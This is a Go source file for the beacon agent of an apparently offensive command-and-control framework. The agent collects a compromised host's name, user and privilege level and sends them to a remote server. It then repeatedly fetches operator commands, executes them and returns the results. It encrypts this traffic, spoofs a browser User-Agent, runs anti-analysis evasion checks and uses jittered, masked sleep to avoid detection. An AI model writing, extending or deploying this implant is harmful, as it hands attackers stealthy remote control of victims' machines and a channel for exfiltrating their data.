package main

import (
	"bytes"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"runtime"
	"time"

	"github.com/mjopsec/taburtuaiC2/shared/crypto"
	"github.com/mjopsec/taburtuaiC2/shared/types"
)

// Agent represents the main agent structure
type Agent struct {
	ID        string
	ServerURL string
	Interval  time.Duration
	Jitter    float64
	isRunning bool
	client    *http.Client
	crypto    *crypto.Manager
	config    *Config
	evasion   *EvasionManager
}

// Config holds agent configuration
type Config struct {
	ServerURL     string
	PrimaryKey    string
	SecondaryKey  string
	Interval      int
	Jitter        float64
	EnableEvasion bool
}

// NewAgent creates a new agent instance
func NewAgent(config *Config) (*Agent, error) {
	cryptoMgr, err := crypto.NewManager(config.PrimaryKey, config.SecondaryKey)
	if err != nil {
		fmt.Printf("[!] Failed to initialize crypto: %v\n", err)
		cryptoMgr = nil
	}

	// Initialize evasion manager
	var evasionMgr *EvasionManager
	if config.EnableEvasion {
		evasionMgr = NewEvasionManager(GetDefaultEvasionConfig())

		// Perform initial evasion checks
		if !evasionMgr.PerformEvasionChecks() {
			return nil, fmt.Errorf("evasion checks failed - hostile environment detected")
		}
	}

	return &Agent{
		ID:        generateUUID(),
		ServerURL: config.ServerURL,
		Interval:  time.Duration(config.Interval) * time.Second,
		Jitter:    config.Jitter,
		isRunning: false,
		client:    &http.Client{Timeout: 60 * time.Second},
		crypto:    cryptoMgr,
		config:    config,
		evasion:   evasionMgr,
	}, nil
}

// CollectInfo gathers system information
func (a *Agent) CollectInfo() types.AgentInfo {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}
	workDir, _ := os.Getwd()

	privileges := "user"
	if runtime.GOOS == "windows" {
		_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
		if err == nil {
			privileges = "admin"
		}
	} else {
		if os.Geteuid() == 0 {
			privileges = "root"
		}
	}

	return types.AgentInfo{
		ID:           a.ID,
		Hostname:     hostname,
		Username:     username,
		OS:           runtime.GOOS,
		Architecture: runtime.GOARCH,
		ProcessID:    os.Getpid(),
		Privileges:   privileges,
		WorkingDir:   workDir,
	}
}

// Checkin performs agent checkin with the server
func (a *Agent) Checkin() error {
	agentInfo := a.CollectInfo()
	agentInfoJSON, err := json.Marshal(agentInfo)
	if err != nil {
		return err
	}

	var payload []byte
	if a.crypto != nil {
		encrypted, err := a.crypto.EncryptData(agentInfoJSON)
		if err != nil {
			fmt.Printf("[!] Failed to encrypt checkin data: %v\n", err)
			payload = agentInfoJSON
		} else {
			envelope := map[string]interface{}{"encrypted_payload": encrypted}
			payload, _ = json.Marshal(envelope)
			fmt.Printf("[*] Checkin data encrypted\n")
		}
	} else {
		payload = agentInfoJSON
	}

	req, err := http.NewRequest("POST", a.ServerURL+"/api/v1/checkin", bytes.NewBuffer(payload))
	if err != nil {
		return err
	}

	// Apply traffic obfuscation if evasion is enabled
	if a.evasion != nil {
		a.evasion.ObfuscateHTTPTraffic(req)
	} else {
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := a.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("checkin failed: %d - %s", resp.StatusCode, string(body))
	}

	return nil
}

// GetNextCommand retrieves the next command from the server
func (a *Agent) GetNextCommand() (*types.Command, error) {
	url := fmt.Sprintf("%s/api/v1/command/%s/next", a.ServerURL, a.ID)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}

	// Apply traffic obfuscation
	if a.evasion != nil {
		a.evasion.ObfuscateHTTPTraffic(req)
	} else {
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	}

	resp, err := a.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNoContent {
		return nil, nil
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	fmt.Printf("[*] Raw command response: %s\n", string(body)) // Debug log

	var response types.APIResponse
	if err := json.Unmarshal(body, &response); err != nil {
		return nil, fmt.Errorf("failed to unmarshal API response: %v", err)
	}

	if !response.Success {
		return nil, fmt.Errorf("server error: %s", response.Error)
	}

	if response.Data == nil {
		return nil, nil
	}

	// Handle encrypted command and nested response structure
	var cmdData []byte

	// First, check if we have nested structure
	if dataMap, ok := response.Data.(map[string]interface{}); ok {
		var actualData interface{}

		// Check for nested result structure first
		if result, hasResult := dataMap["result"].(map[string]interface{}); hasResult {
			actualData = result
			fmt.Printf("[*] Found command in nested result structure\n")
		} else {
			actualData = response.Data
			fmt.Printf("[*] Found command in direct structure\n")
		}

		// Check if data is encrypted
		if dataMap2, ok := actualData.(map[string]interface{}); ok {
			if encrypted, ok := dataMap2["encrypted"].(string); ok && a.crypto != nil {
				fmt.Printf("[*] Decrypting command data\n")
				decrypted, err := a.crypto.DecryptData(encrypted)
				if err != nil {
					return nil, fmt.Errorf("failed to decrypt command: %v", err)
				}
				cmdData = decrypted
			} else {
				// Not encrypted, marshal the data
				cmdData, _ = json.Marshal(actualData)
			}
		} else {
			cmdData, _ = json.Marshal(actualData)
		}
	} else {
		cmdData, _ = json.Marshal(response.Data)
	}

	fmt.Printf("[*] Command data to unmarshal: %s\n", string(cmdData)) // Debug log

	var cmd types.Command
	if err := json.Unmarshal(cmdData, &cmd); err != nil {
		return nil, fmt.Errorf("failed to unmarshal command: %v", err)
	}

	// Validate command has required fields
	if cmd.ID == "" {
		return nil, fmt.Errorf("command missing ID")
	}
	if cmd.Command == "" && cmd.OperationType == "" {
		return nil, fmt.Errorf("command missing command text and operation type")
	}

	fmt.Printf("[*] Parsed command - ID: %s, Command: %s, Type: %s\n", cmd.ID, cmd.Command, cmd.OperationType)

	return &cmd, nil
}

// SubmitResult sends command result back to server
func (a *Agent) SubmitResult(result *types.CommandResult) error {
	resultJSON, err := json.Marshal(result)
	if err != nil {
		return err
	}

	var payload []byte
	if a.crypto != nil {
		encrypted, err := a.crypto.EncryptData(resultJSON)
		if err != nil {
			fmt.Printf("[!] Failed to encrypt result: %v\n", err)
			payload = resultJSON
		} else {
			envelope := map[string]string{"encrypted_payload": encrypted}
			payload, _ = json.Marshal(envelope)
		}
	} else {
		payload = resultJSON
	}

	req, err := http.NewRequest("POST", a.ServerURL+"/api/v1/command/result", bytes.NewBuffer(payload))
	if err != nil {
		return err
	}

	// Apply traffic obfuscation
	if a.evasion != nil {
		a.evasion.ObfuscateHTTPTraffic(req)
	} else {
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := a.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("submit result failed: %d - %s", resp.StatusCode, string(body))
	}

	return nil
}

// GetBeaconInterval calculates next beacon interval with jitter
func (a *Agent) GetBeaconInterval() time.Duration {
	if a.Jitter <= 0 {
		return a.Interval
	}

	jitterRange := float64(a.Interval) * a.Jitter
	jitterNs := int64(jitterRange)
	if jitterNs <= 0 {
		return a.Interval
	}

	b := make([]byte, 8)
	rand.Read(b)
	randomJitter := int64(b[0])<<56 | int64(b[1])<<48 | int64(b[2])<<40 | int64(b[3])<<32 |
		int64(b[4])<<24 | int64(b[5])<<16 | int64(b[6])<<8 | int64(b[7])
	randomJitter = randomJitter % (jitterNs * 2)
	actualJitter := randomJitter - jitterNs

	finalDuration := a.Interval + time.Duration(actualJitter)
	if finalDuration < time.Second {
		finalDuration = time.Second
	}

	return finalDuration
}

// Start begins the agent main loop
func (a *Agent) Start() error {
	a.isRunning = true
	fmt.Printf("[*] Starting agent %s\n", a.ID)
	fmt.Printf("[*] Server: %s\n", a.ServerURL)
	fmt.Printf("[*] Interval: %v (jitter: %.1f%%)\n", a.Interval, a.Jitter*100)

	if a.evasion != nil {
		fmt.Printf("[*] Evasion techniques enabled\n")
	}

	// Initial checkin
	for i := 0; i < 3; i++ {
		if err := a.Checkin(); err != nil {
			fmt.Printf("[!] Checkin attempt %d/3 failed: %v\n", i+1, err)
			if i == 2 {
				return fmt.Errorf("initial checkin failed: %v", err)
			}

			// Use evasion sleep if available
			if a.evasion != nil {
				a.evasion.MaskedSleep(10 * time.Second)
			} else {
				time.Sleep(10 * time.Second)
			}
		} else {
			fmt.Printf("[+] Initial checkin successful\n")
			break
		}
	}

	// Main loop
	for a.isRunning {
		// Get command
		cmd, err := a.GetNextCommand()
		if err != nil {
			fmt.Printf("[!] Failed to get command: %v\n", err)
		} else if cmd != nil {
			fmt.Printf("[*] Received command: %s (ID: %s)\n", cmd.Command, cmd.ID)
			result := ExecuteCommand(a, cmd)
			if err := a.SubmitResult(result); err != nil {
				fmt.Printf("[!] Failed to submit result: %v\n", err)
			}
		}

		// Periodic checkin
		if err := a.Checkin(); err != nil {
			fmt.Printf("[!] Periodic checkin failed: %v\n", err)
		}

		// Sleep with jitter and evasion
		sleepDuration := a.GetBeaconInterval()
		fmt.Printf("[*] Sleeping for %v\n", sleepDuration)

		if a.evasion != nil {
			a.evasion.MaskedSleep(sleepDuration)
		} else {
			time.Sleep(sleepDuration)
		}
	}

	return nil
}

// Stop stops the agent
func (a *Agent) Stop() {
	a.isRunning = false
}
